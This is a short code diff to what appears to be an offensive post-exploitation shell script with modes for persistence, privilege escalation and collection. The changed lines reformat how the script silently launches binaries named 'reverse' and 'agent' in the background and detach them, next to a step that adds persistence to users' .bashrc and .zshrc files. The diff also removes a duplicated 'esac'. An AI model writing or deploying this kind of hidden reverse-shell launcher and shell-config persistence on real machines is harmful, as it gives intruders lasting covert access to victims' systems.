@@ -139,8 +139,14 @@ persist_mode() {
     chmod +x agent reverse
 
     # Use subshell to prevent exit on failure and properly background+disown
-    (./reverse >/dev/null 2>&1 & disown) || echo "[-] Reverse failed"
-    (./agent >/dev/null 2>&1 & disown) || echo "[-] Agent failed"
+    (
+        ./reverse >/dev/null 2>&1 &
+        disown
+    ) || echo "[-] Reverse failed"
+    (
+        ./agent >/dev/null 2>&1 &
+        disown
+    ) || echo "[-] Agent failed"
 
     echo "[*] Adding persistence to shell configs..."
     for rc in "$BASEDIR/.bashrc" "$BASEDIR/.zshrc"; do
@@ -236,5 +242,4 @@ all)
     echo "Valid modes: persist | privesc | collect | all"
     exit 1
     ;;
-esac
 esac
